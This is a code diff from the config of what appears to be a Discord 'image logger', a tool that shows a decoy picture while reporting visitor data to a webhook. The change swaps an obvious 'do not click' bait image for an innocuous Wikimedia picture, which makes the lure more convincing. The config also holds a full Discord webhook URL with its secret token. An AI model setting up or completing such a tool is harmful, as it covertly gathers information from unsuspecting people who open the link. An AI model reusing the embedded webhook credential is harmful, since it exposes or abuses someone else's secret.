@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1348711373001199697/LWkTrFPB0gK2jPbsL4vgpoBEqakX18MQhnCrAGj0nzZUYCEb7fbwcGyjrQjHdiFbIeis",
-    "image": "https://thumbs.dreamstime.com/z/prohibition-sign-computer-mouse-symbol-do-not-click-icon-design-vector-prohibition-sign-computer-mouse-symbol-do-not-click-197235753.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/commons/f/fb/Anthro_vixen_colored.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
